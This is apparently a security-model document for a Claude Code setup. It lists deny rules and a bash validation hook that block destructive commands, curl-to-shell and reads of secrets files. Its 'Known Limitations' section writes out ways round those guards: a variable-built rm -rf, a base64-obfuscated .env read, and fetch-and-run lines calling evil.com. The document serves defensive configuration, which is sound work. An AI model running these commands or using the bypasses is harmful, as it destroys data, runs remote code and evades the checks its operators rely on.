# Security Model

This document describes what is and isn't protected by this configuration.

> **Important**: This is a safety net, not a security boundary. A sophisticated user can bypass these protections. See "Known Limitations" below.

## Actually Protected

The following are blocked from Claude's access via `settings.json` deny rules:

### Files (Read/Edit/Write blocked)
- `.env` and `.env.*` files

### Bash Commands (blocked patterns)
- Destructive commands: `rm -rf /`, `rm -rf ~`, `rm -rf .`
- Privilege escalation: `sudo`
- Dangerous permissions: `chmod 777`
- Remote code execution: `curl | bash`, `curl | sh`, `wget | bash`, `wget | sh`

### Additional Runtime Validation (validate-bash.sh hook)
- Fork bombs (`:(){}` patterns)
- Disk formatting (`mkfs`, `fdisk`, `parted`)
- Direct disk writes (`dd if=... of=/dev/...`)
- Path traversal in rm commands (catches `rm -rf ../` pattern, not all variations)

### Stack-Specific Protections
When using stack presets (`stacks/*/settings.json`), additional protections are enabled:
- **All stacks**: `Read(**/secrets/**)`
- **Ruby**: `config/credentials.yml.enc`, `config/master.key` (Rails encrypted credentials)
- **Elixir**: `config/prod.secret.exs`

## NOT Protected (Common Misconceptions)

The following are **NOT blocked** by default:

- `*.pem`, `*.key`, `*.p12`, `*.pfx` files (add to deny list if needed)
- Files with `secret`, `credential`, or `password` in names
- Directories named `secrets/`, `credentials/`, `private/`
- Reading files via `cat`, `head`, `tail`, `less`, `grep`
- Environment variable access via `printenv`, `env`
- Reading sensitive files through allowed Bash commands

To add these protections, edit `.claude/settings.json`:

```json
{
  "permissions": {
    "deny": [
      "Read(**/*.pem)",
      "Read(**/*.key)",
      "Read(**/secrets/**)",
      "Bash(printenv:*)",
      "Bash(env)"
    ]
  }
}
```

## Defense Layers

1. **Static permissions** (`settings.json` deny rules)
   - First line of defense
   - Pattern-matched before tool execution
   - Cannot be bypassed by Claude

2. **Bash validation hook** (`validate-bash.sh`)
   - Runs before Bash commands execute
   - Requires `jq` for JSON parsing (blocks all commands if jq missing)
   - Normalizes whitespace to prevent bypass attempts
   - Catches some destructive patterns not in deny list
   - Also **warns** (but doesn't block) on: `sudo`, `--force`/`-f` flags, `eval`

3. **Claudeignore** (`.claudeignore`)
   - Prevents files from appearing in Claude's context
   - Reduces accidental exposure
   - **Not a security boundary** - Claude can still attempt to read files

## Known Limitations

**These protections can be bypassed:**

1. **Variable-based command construction**
   ```bash
   X=/; rm -rf $X  # Bypasses "rm -rf /" pattern
   ```

2. **Encoded/obfuscated access**
   ```bash
   base64 -d <<< "Li5lbnY=" | xargs cat  # Decodes to "../.env"
   ```

3. **Process substitution**
   ```bash
   bash <(curl http://evil.com)  # Bypasses "curl | bash" pattern
   ```

4. **Indirect file download**
   ```bash
   curl http://evil.com > /tmp/x && bash /tmp/x
   ```

5. **Indirect exposure**
   - If your code reads `.env` and logs values, Claude sees the logs
   - If tests output secrets, Claude sees test output

6. **Memory/context leakage**
   - If you paste secrets into chat, they're in context
   - Previous sessions aren't cleared automatically

7. **Network exfiltration**
   - Claude can make outbound requests if your code does
   - API calls that include tokens in headers

## Recommendations

### For Maximum Security

1. **Use environment variable injection at runtime**
   - Don't store secrets in files in the repo
   - Use secret managers (Vault, AWS Secrets Manager, etc.)

2. **Scope Claude's access**
   - Run Claude in a container/sandbox
   - Use separate credentials for dev vs prod

3. **Review before commit**
   - Always review Claude's changes before committing
   - Use the pre-commit review hook
   - Check for accidentally added secrets

4. **Add project-specific deny rules**
   - Block patterns specific to your secrets
   - Add directory-level blocks for sensitive areas

### Adding Custom Protections

Edit `.claude/settings.json` to add deny rules:

```json
{
  "permissions": {
    "deny": [
      "Read(config/production.json)",
      "Read(**/internal/**)",
      "Bash(aws sts:*)",
      "Bash(gcloud auth:*)"
    ]
  }
}
```

Edit `.claude/hooks/validate-bash.sh` to add pattern checks:

```bash
# Add custom blocked patterns
if matches "my-secret-command"; then
  echo "BLOCKED: Custom pattern" >&2
  exit 2
fi
```

## Incident Response

If you believe secrets were exposed:

1. Rotate the compromised credentials immediately
2. Check Claude session history for exposure
3. Review git history for accidental commits
4. Add new deny rules to prevent recurrence
5. Consider whether additional protections are needed

## Security vs Usability Tradeoff

This configuration balances security and usability. Some legitimate operations may be blocked:

- Running commands with "rm" in them (even safe ones)
- Commands that look like pipes to shells

If a command is blocked incorrectly, you can:
1. Add it to the `allow` list in settings.json
2. Modify validate-bash.sh to whitelist specific patterns
3. Run the command manually outside Claude
